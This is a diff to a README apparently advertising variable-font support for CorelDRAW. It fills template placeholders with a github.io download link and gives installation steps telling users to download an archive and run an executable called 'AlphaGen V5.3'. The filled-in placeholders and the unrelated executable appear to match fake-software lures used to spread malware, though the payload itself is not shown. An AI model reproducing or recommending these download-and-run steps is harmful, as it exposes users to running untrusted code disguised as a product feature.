@@ -2,13 +2,13 @@
 
 Explore flexible typography with Variable Fonts Support in CorelDRAW — adjust weight, width, and slant in real time with a single font file.
 
-[![Download](https://img.shields.io/badge/Download-Variable_Fonts_CorelDRAW-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Variable_Fonts_CorelDRAW-blueviolet)](https://variable-fonts-support-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://variable-fonts-support-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate OpenType variable font support  
 4. ✅ Open CorelDRAW and select any installed variable font to begin editing axis properties
